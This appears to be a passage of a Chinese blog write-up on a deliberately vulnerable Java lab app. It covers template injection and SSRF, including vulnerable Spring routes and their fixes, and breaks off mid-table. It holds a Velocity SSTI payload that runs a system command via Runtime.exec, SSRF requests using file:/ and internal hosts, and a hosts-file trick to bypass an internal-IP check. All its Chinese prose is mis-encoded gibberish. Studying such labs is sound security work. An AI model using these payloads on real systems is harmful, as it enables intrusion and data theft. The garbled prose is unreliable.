<pre><code class="java">#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930110431275.png" alt="image-20240930110431275"></p>
<p>æˆåŠŸæ¨¡æ¿æ³¨å…¥ã€‚</p>
<h2 id="å››ã€SSRF"><a href="#å››ã€SSRF" class="headerlink" title="å››ã€SSRF"></a>å››ã€SSRF</h2><h3 id="1-è·¯ç”±-x2F-ssrf-x2F-urlConnection-x2F-vuln"><a href="#1-è·¯ç”±-x2F-ssrf-x2F-urlConnection-x2F-vuln" class="headerlink" title="1.è·¯ç”±&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln"></a>1.è·¯ç”±&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">    @RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)
    public String URLConnectionVuln(String url) &#123;
        return HttpUtils.URLConnection(url);
    &#125;
</code></pre>
<p>å†æ¥çœ‹å‡½æ•°<code>UrlConnection</code>çš„å®šä¹‰ï¼š</p>
<pre><code class="java">   public static String URLConnection(String url) &#123;
        try &#123;
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) &#123;
                html.append(inputLine);
            &#125;
            in.close();
            return html.toString();
        &#125; catch (Exception e) &#123;
            logger.error(e.getMessage());
            return e.getMessage();
        &#125;
    &#125;
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨æ–‡ä»¶è¯»å–åè®®<code>file:/</code>å®ç°è®¿é—®ï¼Œä¹Ÿå¯ä»¥è®¿é—®åˆ°å†…ç½‘çš„å…¶ä»–ä¸»æœº</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930115111649.png" alt="image-20240930115111649"></p>
<h3 id="2-è·¯ç”±-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln"><a href="#2-è·¯ç”±-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln" class="headerlink" title="2.è·¯ç”±&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln"></a>2.è·¯ç”±&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">@GetMapping(&quot;/HttpURLConnection/vuln&quot;)
public String httpURLConnectionVuln(@RequestParam String url) &#123;
    return HttpUtils.HttpURLConnection(url);
&#125;
</code></pre>
<p>æ¥çœ‹å‡½æ•°<code>HttpUrlConnection</code>å®šä¹‰ï¼š</p>
<pre><code class="java">    public static String HttpURLConnection(String url) &#123;
        try &#123;
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            HttpURLConnection conn = (HttpURLConnection) urlConnection;
//             conn.setInstanceFollowRedirects(false);
//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField
            InputStream is = conn.getInputStream();  // send request
            BufferedReader in = new BufferedReader(new InputStreamReader(is));
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) &#123;
                html.append(inputLine);
            &#125;
            in.close();
            return html.toString();
        &#125; catch (IOException e) &#123;
            logger.error(e.getMessage());
            return e.getMessage();
        &#125;
    &#125;
</code></pre>
<p>è¿™é‡Œç”¨<code>HttpURLConnection</code>ç±»è¿›è¡Œäº†ä¸€ä¸ªå¼ºè½¬ï¼Œé™åˆ¶åªèƒ½ä½¿ç”¨http&#x2F;httpsåè®®ï¼Œä½†å¯ä»¥è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœºï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930143648191.png" alt="image-20240930143648191"></p>
<h3 id="3-è·¯ç”±-x2F-ssrf-x2F-openStream"><a href="#3-è·¯ç”±-x2F-ssrf-x2F-openStream" class="headerlink" title="3.è·¯ç”±&#x2F;ssrf&#x2F;openStream"></a>3.è·¯ç”±&#x2F;ssrf&#x2F;openStream</h3><pre><code class="java">    @GetMapping(&quot;/openStream&quot;)
    public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException &#123;
        InputStream inputStream = null;
        OutputStream outputStream = null;
        try &#123;
            String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + &quot;.&quot; + WebUtils.getFileExtension(url);
            // download
            response.setHeader(&quot;content-disposition&quot;, &quot;attachment;fileName=&quot; + downLoadImgFileName);

            URL u = new URL(url);
            int length;
            byte[] bytes = new byte[1024];
            inputStream = u.openStream(); // send request
            outputStream = response.getOutputStream();
            while ((length = inputStream.read(bytes)) &gt; 0) &#123;
                outputStream.write(bytes, 0, length);
            &#125;

        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
        &#125; finally &#123;
            if (inputStream != null) &#123;
                inputStream.close();
            &#125;
            if (outputStream != null) &#123;
                outputStream.close();
            &#125;
        &#125;
    &#125;
</code></pre>
<p>å¯ä»¥é€šè¿‡è¿™ä¸ªè·¯ç”±å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930145400529.png" alt="image-20240930145400529"></p>
<h3 id="4-è·¯ç”±-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln"><a href="#4-è·¯ç”±-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln" class="headerlink" title="4.è·¯ç”±&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln"></a>4.è·¯ç”±&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">    @GetMapping(&quot;/HttpSyncClients/vuln&quot;)
    public String HttpSyncClients(@RequestParam(&quot;url&quot;) String url) &#123;
        return HttpUtils.HttpAsyncClients(url);
    &#125;
</code></pre>
<p><code>HttpAsyncClients</code>å‡½æ•°ï¼š</p>
<pre><code class="java"> public static String HttpAsyncClients(String url) &#123;
        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();
        try &#123;
            httpclient.start();
            final HttpGet request = new HttpGet(url);
            Future&lt;HttpResponse&gt; future = httpclient.execute(request, null);
            HttpResponse response = future.get(6000, TimeUnit.MILLISECONDS);
            return EntityUtils.toString(response.getEntity());
        &#125; catch (Exception e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            try &#123;
                httpclient.close();
            &#125; catch (Exception e) &#123;
                logger.error(e.getMessage());
            &#125;
        &#125;
    &#125;
</code></pre>
<p>æœªå¯¹SSRFè¿›è¡Œæ£€æŸ¥ï¼Œå­˜åœ¨æ¼æ´ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930160113322.png" alt="image-20240930160113322"></p>
<h3 id="5-è·¯ç”±-x2F-ssrf-x2F-restTemplate-x2F-vuln1"><a href="#5-è·¯ç”±-x2F-ssrf-x2F-restTemplate-x2F-vuln1" class="headerlink" title="5.è·¯ç”±&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1"></a>5.è·¯ç”±&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java"> @GetMapping(&quot;/restTemplate/vuln1&quot;)
    public String RestTemplateUrlBanRedirects(String url)&#123;
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttpBanRedirects(url, headers);
    &#125;
</code></pre>
<p>è¿™æ®µä»£ç ä½¿ç”¨ <strong>Spring RestTemplate</strong> æ¥è¿›è¡Œ HTTP è¯·æ±‚ï¼Œå¹¶ç¦æ­¢äº†é‡å®šå‘ï¼Œä½†ä¸å½±å“ç›´æ¥è®¿é—®ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930161505278.png" alt="image-20240930161505278"></p>
<h3 id="6-è·¯ç”±-x2F-ssrf-x2F-restTemplate-x2F-vuln2"><a href="#6-è·¯ç”±-x2F-ssrf-x2F-restTemplate-x2F-vuln2" class="headerlink" title="6.è·¯ç”±&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2"></a>6.è·¯ç”±&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">   @GetMapping(&quot;/restTemplate/vuln2&quot;)
    public String RestTemplateUrl(String url)&#123;
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttp(url, headers);
    &#125;
</code></pre>
<p>è¿™ä¸ªä¸ç¦æ­¢é‡å®šå‘äº†ï¼Œç›´æ¥å°±å¯ä»¥SSRF</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930162139227.png" alt="image-20240930162139227"></p>
<h3 id="7-è·¯ç”±-x2F-ssrf-x2F-hutool-x2F-vuln"><a href="#7-è·¯ç”±-x2F-ssrf-x2F-hutool-x2F-vuln" class="headerlink" title="7.è·¯ç”±&#x2F;ssrf&#x2F;hutool&#x2F;vuln"></a>7.è·¯ç”±&#x2F;ssrf&#x2F;hutool&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">@GetMapping(&quot;/hutool/vuln&quot;)
public String hutoolHttp(String url)&#123;
    return HttpUtil.get(url);
&#125;
</code></pre>
<p>æ¢æ±¤ä¸æ¢è¯ï¼Œè¯¥åº“ä¹Ÿèƒ½SSRF,ä¸è¿‡ç¦æ­¢äº†é‡å®šå‘ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930162620184.png" alt="image-20240930162620184"></p>
<h3 id="8-è·¯ç”±-x2F-ssrf-x2F-denrebind-x2F-vuln"><a href="#8-è·¯ç”±-x2F-ssrf-x2F-denrebind-x2F-vuln" class="headerlink" title="8.è·¯ç”±&#x2F;ssrf&#x2F;denrebind&#x2F;vuln"></a>8.è·¯ç”±&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code>@GetMapping(&quot;/dnsrebind/vuln&quot;)
public String DnsRebind(String url) &#123;
    java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);
    if (!SecurityUtil.checkSSRFWithoutRedirect(url)) &#123;
        return &quot;Dangerous url&quot;;
    &#125;
    return HttpUtil.get(url);
&#125;
</code></pre>
<p><code>checkSSRFWithoutRedirect</code>å‡½æ•°ï¼š</p>
<pre><code class="Java"> /**
     * ä¸èƒ½ä½¿ç”¨ç™½åå•çš„æƒ…å†µä¸‹å»ºè®®ä½¿ç”¨è¯¥æ–¹æ¡ˆã€‚å‰ææ˜¯ç¦ç”¨é‡å®šå‘å¹¶ä¸”TTLé»˜è®¤ä¸ä¸º0ã€‚
     * å­˜åœ¨é—®é¢˜ï¼š
     *  1ã€TTLä¸º0ä¼šè¢«ç»•è¿‡
     *  2ã€ä½¿ç”¨é‡å®šå‘å¯ç»•è¿‡
     *
     * @param url The url that needs to check.
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFWithoutRedirect(String url) &#123;
        if(url == null) &#123;
            return false;
        &#125;
        return !SSRFChecker.isInternalIpByUrl(url);
    &#125;
</code></pre>
<p><code>isInternalIpByUrl</code>å‡½æ•°ï¼š</p>
<pre><code class="java">public static boolean isInternalIpByUrl(String url) &#123;

        String host = url2host(url);
        if (host.equals(&quot;&quot;)) &#123;
            return true; // å¼‚å¸¸URLå½“æˆå†…ç½‘IPç­‰éæ³•URLå¤„ç†
        &#125;

        String ip = host2ip(host);
        if (ip.equals(&quot;&quot;)) &#123;
            return true; // å¦‚æœåŸŸåè½¬æ¢ä¸ºIPå¼‚å¸¸ï¼Œåˆ™è®¤ä¸ºæ˜¯éæ³•URL
        &#125;

        return isInternalIp(ip);
    &#125;
</code></pre>
<p>æ·»åŠ äº†IPæ£€æŸ¥ï¼Œä¿®æ”¹ä¸€ä¸‹dnsè§£æå³å¯ç»•è¿‡ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<p>ç»™æœ¬åœ°çš„hostsæ–‡ä»¶æ·»åŠ ä¸€æ¡è§£æè®°å½•ï¼š</p>
<pre><code>192.168.1.43 www.baidu.com
</code></pre>
<p>ç„¶åå°±å¯ä»¥å®ç°ssrfï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930165613203.png" alt="image-20240930165613203"></p>
<h3 id="SSRFä¿®å¤ä¸é˜²æŠ¤"><a href="#SSRFä¿®å¤ä¸é˜²æŠ¤" class="headerlink" title="SSRFä¿®å¤ä¸é˜²æŠ¤"></a>SSRFä¿®å¤ä¸é˜²æŠ¤</h3><h4 id="ï¼ˆ1ï¼‰é™åˆ¶åè®®ä½¿ç”¨"><a href="#ï¼ˆ1ï¼‰é™åˆ¶åè®®ä½¿ç”¨" class="headerlink" title="ï¼ˆ1ï¼‰é™åˆ¶åè®®ä½¿ç”¨"></a>ï¼ˆ1ï¼‰é™åˆ¶åè®®ä½¿ç”¨</h4><p>ä¿®å¤ä»£ç ï¼š</p>
<pre><code class="Java">@GetMapping(&quot;/urlConnection/sec&quot;)
    public String URLConnectionSec(String url) &#123;

        // Decline not http/https protocol
        if (!SecurityUtil.isHttp(url)) &#123;
            return &quot;[-] SSRF check failed&quot;;
        &#125;

        try &#123;
            SecurityUtil.startSSRFHook();
            return HttpUtils.URLConnection(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

    &#125;
</code></pre>
<p>isHttpå‡½æ•°å®šä¹‰ï¼š</p>
<pre><code class="java"> public static boolean isHttp(String url) &#123;
        return url.startsWith(&quot;http://&quot;) || url.startsWith(&quot;https://&quot;);
    &#125;
</code></pre>
<p>ç¦ç”¨æ‰äº†é™¤http&#x2F;httpsä»¥å¤–çš„åè®®ï¼Œæ·»åŠ äº†SSRFæ£€æŸ¥ã€‚</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930142358450.png" alt="image-20240930142358450"></p>
<h4 id="ï¼ˆ2ï¼‰é™åˆ¶æ–‡ä»¶ç±»å‹"><a href="#ï¼ˆ2ï¼‰é™åˆ¶æ–‡ä»¶ç±»å‹" class="headerlink" title="ï¼ˆ2ï¼‰é™åˆ¶æ–‡ä»¶ç±»å‹"></a>ï¼ˆ2ï¼‰é™åˆ¶æ–‡ä»¶ç±»å‹</h4><p>ä¿®å¤ä»£ç ï¼š</p>
<pre><code class="java">   @GetMapping(&quot;/ImageIO/sec&quot;)
    public String ImageIO(@RequestParam String url) &#123;
        try &#123;
            SecurityUtil.startSSRFHook();
            HttpUtils.imageIO(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

        return &quot;ImageIO ssrf test&quot;;
    &#125;
</code></pre>
<p><code>imageIO</code>å‡½æ•°ï¼š</p>
<pre><code class="Java">public static void imageIO(String url) &#123;
        try &#123;
            URL u = new URL(url);
            ImageIO.read(u); // send request
        &#125; catch (IOException e) &#123;
            logger.error(e.getMessage());
        &#125;

    &#125;
</code></pre>
<p>ä½¿ç”¨ <code>Spring</code> æ¡†æ¶çš„æ§åˆ¶å™¨æ–¹æ³•ï¼Œç”¨äºè¿›è¡Œä¸€ä¸ª URL è¯·æ±‚ï¼Œå¹¶é€šè¿‡è°ƒç”¨ <code>ImageIO</code> å¤„ç†è¯¥ URL æŒ‡å®šçš„å›¾ç‰‡ã€‚åŒæ—¶ï¼Œå®ƒè¿˜åˆ©ç”¨äº†æŸç§å®‰å…¨æœºåˆ¶æ¥é˜²æ­¢ SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ”»å‡»ã€‚</p>
<h4 id="ï¼ˆ3ï¼‰httpè¯·æ±‚æ£€æŸ¥"><a href="#ï¼ˆ3ï¼‰httpè¯·æ±‚æ£€æŸ¥" class="headerlink" title="ï¼ˆ3ï¼‰httpè¯·æ±‚æ£€æŸ¥"></a>ï¼ˆ3ï¼‰httpè¯·æ±‚æ£€æŸ¥</h4><h5 id="æ–¹æ³•1ï¼š"><a href="#æ–¹æ³•1ï¼š" class="headerlink" title="æ–¹æ³•1ï¼š"></a>æ–¹æ³•1ï¼š</h5><pre><code class="java">    @GetMapping(&quot;/okhttp/sec&quot;)
    public String okhttp(@RequestParam String url) &#123;

        try &#123;
            SecurityUtil.startSSRFHook();
            return HttpUtils.okhttp(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

    &#125;
</code></pre>
<p><code>okhttp</code>å‡½æ•°ï¼š</p>
<pre><code class="java">public static String okhttp(String url) throws IOException &#123;
    OkHttpClient client = new OkHttpClient();
    com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();
    return client.newCall(ok_http).execute().body().string();
&#125;
</code></pre>
<h5 id="æ–¹æ³•2ï¼š"><a href="#æ–¹æ³•2ï¼š" class="headerlink" title="æ–¹æ³•2ï¼š"></a>æ–¹æ³•2ï¼š</h5><pre><code class="java"> @GetMapping(&quot;/httpclient/sec&quot;)
    public String HttpClient(@RequestParam String url) &#123;

        try &#123;
            SecurityUtil.startSSRFHook();
            return HttpUtils.httpClient(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

    &#125;
</code></pre>
<p><code>httpClient</code>å‡½æ•°ï¼š</p>
<pre><code class="java">public static String httpClient(String url) &#123;

        StringBuilder result = new StringBuilder();

        try &#123;

            CloseableHttpClient client = HttpClients.createDefault();
            HttpGet httpGet = new HttpGet(url);
            // set redirect enable false
            // httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());
            HttpResponse httpResponse = client.execute(httpGet); // send request
            BufferedReader rd = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));

            String line;
            while ((line = rd.readLine()) != null) &#123;
                result.append(line);
            &#125;

            return result.toString();

        &#125; catch (Exception e) &#123;
            return e.getMessage();
        &#125;
    &#125;
</code></pre>
<h5 id="æ–¹æ³•3ï¼š"><a href="#æ–¹æ³•3ï¼š" class="headerlink" title="æ–¹æ³•3ï¼š"></a>æ–¹æ³•3ï¼š</h5><pre><code class="java">@GetMapping(&quot;/commonsHttpClient/sec&quot;)
public String commonsHttpClient(@RequestParam String url) &#123;

    try &#123;
        SecurityUtil.startSSRFHook();
        return HttpUtils.commonHttpClient(url);
    &#125; catch (SSRFException | IOException e) &#123;
        return e.getMessage();
    &#125; finally &#123;
        SecurityUtil.stopSSRFHook();
    &#125;

&#125;
</code></pre>
<p><code>commonHttpClient</code>å‡½æ•°ï¼š</p>
<pre><code class="java">    public static String commonHttpClient(String url) &#123;

        HttpClient client = new HttpClient();
        GetMethod method = new GetMethod(url);

        try &#123;
            client.executeMethod(method); // send request
            byte[] resBody = method.getResponseBody();
            return new String(resBody);

        &#125; catch (IOException e) &#123;
            return &quot;Error: &quot; + e.getMessage();
        &#125; finally &#123;
            // Release the connection.
            method.releaseConnection();
        &#125;
    &#125;
</code></pre>
<h5 id="æ–¹æ³•4ï¼š"><a href="#æ–¹æ³•4ï¼š" class="headerlink" title="æ–¹æ³•4ï¼š"></a>æ–¹æ³•4ï¼š</h5><pre><code class="java">    @GetMapping(&quot;/Jsoup/sec&quot;)
    public String Jsoup(@RequestParam String url) &#123;

        try &#123;
            SecurityUtil.startSSRFHook();
            return HttpUtils.Jsoup(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

    &#125;
</code></pre>
<p><code>Jsoup</code>å‡½æ•°ï¼š</p>
<pre><code class="java">   public static String Jsoup(String url) &#123;
        try &#123;
            Document doc = Jsoup.connect(url)
//                    .followRedirects(false)
                    .timeout(3000)
                    .cookie(&quot;name&quot;, &quot;joychou&quot;) // request cookies
                    .execute().parse();
            return doc.outerHtml();
        &#125; catch (IOException e) &#123;
            return e.getMessage();
        &#125;
    &#125;
</code></pre>
<h5 id="æ–¹æ³•5ï¼š"><a href="#æ–¹æ³•5ï¼š" class="headerlink" title="æ–¹æ³•5ï¼š"></a>æ–¹æ³•5ï¼š</h5><pre><code class="java">  @GetMapping(&quot;/IOUtils/sec&quot;)
    public String IOUtils(String url) &#123;
        try &#123;
            SecurityUtil.startSSRFHook();
            HttpUtils.IOUtils(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

        return &quot;IOUtils ssrf test&quot;;
    &#125;
</code></pre>
<p><code>IOUtils</code>å‡½æ•°ï¼š</p>
<pre><code class="java">  public static void IOUtils(String url) &#123;
        try &#123;
            IOUtils.toByteArray(URI.create(url));
        &#125; catch (IOException e) &#123;
            logger.error(e.getMessage());
        &#125;
    &#125;
</code></pre>
<p> <strong>å¯¹æ¯” OkHttpã€HttpClientã€CommonHttpClientã€Jsoup å’Œ IOUtils</strong></p>
<p>è¿™äº”ç§åº“å„è‡ªæœ‰ä¸åŒçš„ç‰¹ç‚¹ï¼Œé€‚ç”¨äºä¸åŒçš„åœºæ™¯ã€‚ä¸‹é¢ä»å‡ ä¸ªå…³é”®ç»´åº¦ï¼ˆå¦‚åŠŸèƒ½ã€çµæ´»æ€§ã€å¤æ‚æ€§ã€æ€§èƒ½ã€é€‚ç”¨åœºæ™¯ç­‰ï¼‰å¯¹å®ƒä»¬è¿›è¡Œæ¯”è¾ƒã€‚</p>
<table>
<thead>
<tr>
<th>åº“åç§°</th>
<th>åŠŸèƒ½æ¦‚è¿°</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OkHttp</strong></td>
<td>ä¸€ä¸ªç°ä»£åŒ–ã€åŠŸèƒ½ä¸°å¯Œä¸”é«˜æ€§èƒ½çš„ HTTP å®¢æˆ·ç«¯åº“ï¼Œæ”¯æŒåŒæ­¥ä¸å¼‚æ­¥è¯·æ±‚ã€è¿æ¥æ± ã€è¶…æ—¶æ§åˆ¶ã€è‡ªåŠ¨é‡å®šå‘ã€WebSocket æ”¯æŒç­‰ã€‚</td>
</tr>
<tr>
<td><strong>HttpClient</strong></td>
<td>Apache HttpComponents æä¾›çš„ HTTP å®¢æˆ·ç«¯ï¼ŒåŠŸèƒ½ä¸°å¯Œï¼Œæ”¯æŒè¿æ¥ç®¡ç†ã€é‡å®šå‘ã€è®¤è¯ã€ä»£ç†ç­‰ã€‚é€‚ç”¨äºå¤æ‚çš„ HTTP è¯·æ±‚åœºæ™¯ã€‚</td>
</tr>
<tr>
<td><strong>CommonHttpClient</strong></td>
<td>è¾ƒæ—§ç‰ˆæœ¬çš„ Apache HTTP Clientï¼ˆHttpClient 3.x ç³»åˆ—ï¼‰ï¼Œè™½ç„¶åŠŸèƒ½è¾ƒå¼ºï¼Œä½†å·²ç»è¢«åºŸå¼ƒï¼Œä¸»è¦æ˜¯ä¸ºäº†å‘ä¸‹å…¼å®¹ä¸€äº›è€ç³»ç»Ÿã€‚</td>
</tr>
<tr>
<td><strong>Jsoup</strong></td>
<td>ä¸»è¦ç”¨äºè§£æå’Œæ“ä½œ HTML æ–‡æ¡£ï¼ŒåŒæ—¶æä¾› HTTP è¯·æ±‚åŠŸèƒ½ï¼Œé€‚ç”¨äº Web æŠ“å–ã€è§£æå’Œå¤„ç†ç½‘é¡µæ•°æ®ï¼Œä¸ä¸“æ³¨äºçº¯ç²¹çš„ HTTP é€šä¿¡ã€‚</td>
</tr>
<tr>
<td><strong>IOUtils</strong></td>
<td>Apache Commons IO æä¾›çš„å·¥å…·ç±»åº“ï¼Œä¸“æ³¨äºæµå¤„ç†ï¼Œæä¾›ç®€å•çš„ API æ¥è¯»å–ã€å†™å…¥å’Œè½¬æ¢æµï¼Œ<code>toByteArray</code> åªæ˜¯ä» URL è¯»å–æ•°æ®çš„ä¸€ç§æ–¹å¼ï¼Œè¾ƒç®€å•çš„ HTTP è¯·æ±‚æ–¹å¼ã€‚</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>åº“åç§°</th>
<th>çµæ´»æ€§ä¸é…ç½®</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OkHttp</strong></td>
<td>é«˜åº¦å¯é…ç½®ï¼Œæ”¯æŒè¯·æ±‚è¶…æ—¶ã€æ‹¦æˆªå™¨ã€ç¼“å­˜æ§åˆ¶ã€è¿æ¥æ± ã€å¼‚æ­¥è¯·æ±‚ã€é‡å®šå‘ç®¡ç†ç­‰åŠŸèƒ½ï¼Œé€‚åˆéœ€è¦çµæ´» HTTP è¯·æ±‚çš„åœºæ™¯ã€‚</td>
</tr>
<tr>
<td><strong>HttpClient</strong></td>
<td>æä¾›å¤æ‚çš„ HTTP é…ç½®ï¼ŒåŒ…æ‹¬è¿æ¥æ± ã€ä»£ç†è®¾ç½®ã€è®¤è¯ã€è¿æ¥è¶…æ—¶ã€è¯·æ±‚è¶…æ—¶ã€é‡å®šå‘ç­–ç•¥ç­‰ï¼Œé€‚åˆå¤§è§„æ¨¡ã€å¤æ‚çš„ HTTP é€šä¿¡åœºæ™¯ã€‚</td>
</tr>
<tr>
<td><strong>CommonHttpClient</strong></td>
<td>æä¾›ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†ç”±äºæ˜¯è¿‡æ—¶çš„ç‰ˆæœ¬ï¼Œç¼ºä¹ç°ä»£ HTTP å®¢æˆ·ç«¯çš„ä¸€äº›æ€§èƒ½å’Œçµæ´»æ€§ä¼˜åŒ–ã€‚</td>
</tr>
<tr>
<td><strong>Jsoup</strong></td>
<td>ä¸»è¦åŠŸèƒ½åœ¨äºè§£æ HTML æ–‡æ¡£ï¼Œå®ƒçš„ HTTP è¯·æ±‚é…ç½®é€‰é¡¹è¾ƒå°‘ï¼Œæ”¯æŒè¶…æ—¶ã€é‡å®šå‘æ§åˆ¶ã€Cookieã€User-Agent ç­‰å°‘é‡é…ç½®ï¼Œä¸“æ³¨äºç½‘é¡µæŠ“å–å’Œ HTML å¤„ç†ã€‚</td>
</tr>
<tr>
<td><strong>IOUtils</strong></td>
<td>IOUtils åªæ˜¯ç®€å•åœ°å°†èµ„æºè½¬æ¢ä¸ºå­—èŠ‚æµï¼Œå‡ ä¹æ²¡æœ‰ HTTP è¯·æ±‚çš„é…ç½®é€‰é¡¹ï¼Œé€‚åˆè¯»å–å°å‹èµ„æºï¼Œä¸é€‚åˆå¤æ‚çš„ HTTP é€šä¿¡ï¼Œæ— æ³•é…ç½®ä»£ç†ã€é‡å®šå‘ç­‰é«˜çº§åŠŸèƒ½ã€‚</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>åº“åç§°</th>
<th>å¤æ‚æ€§</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OkHttp</strong></td>
<td>å¤æ‚åº¦é€‚ä¸­ï¼Œæä¾›ç›´è§‚çš„ APIï¼Œé€‚åˆéœ€è¦çµæ´» HTTP è¯·æ±‚ä¸”å¯¹æ€§èƒ½æœ‰è¦æ±‚çš„åº”ç”¨ç¨‹åºã€‚</td>
</tr>
<tr>
<td><strong>HttpClient</strong></td>
<td>åŠŸèƒ½å¼ºå¤§ï¼Œä½†ç›¸å¯¹å¤æ‚ï¼Œé€‚åˆéœ€è¦ç²¾ç»†æ§åˆ¶ HTTP è¯·æ±‚è¡Œä¸ºçš„åœºæ™¯ã€‚</td>
</tr>
<tr>
<td><strong>CommonHttpClient</strong></td>
<td>ä¸ HttpClient ç±»ä¼¼ï¼Œä½†è¾ƒæ—§ï¼ŒAPI è¾ƒå¤æ‚ï¼Œä¸å»ºè®®åœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td><strong>Jsoup</strong></td>
<td>éå¸¸ç®€å•æ˜“ç”¨ï¼Œå°¤å…¶åœ¨ç½‘é¡µæŠ“å–å’Œ HTML è§£ææ–¹é¢ï¼›ä½†å¯¹äºå¤æ‚çš„ HTTP é€šä¿¡åœºæ™¯å¹¶ä¸é€‚ç”¨ã€‚</td>
</tr>
<tr>
<td><strong>IOUtils</strong></td>
<td>ç®€å•ä¸”åŠŸèƒ½æœ‰é™ï¼Œé€‚ç”¨äºç®€å•çš„æ•°æ®è¯»å–æ“ä½œï¼Œä»£ç ç®€æ´ï¼Œä½†ä¸æ”¯æŒå¤æ‚çš„ HTTP è¯·æ±‚åœºæ™¯</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>åº“åç§°</th>
<th>æ€§èƒ½</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OkHttp</strong></td>
<td>æ€§èƒ½éå¸¸å¥½ï¼Œæ”¯æŒè¿æ¥æ± ã€ç¼“å­˜ç­‰ä¼˜åŒ–æªæ–½ï¼Œåœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹è¡¨ç°ä¼˜å¼‚ã€‚</td>
</tr>
<tr>
<td><strong>HttpClient</strong></td>
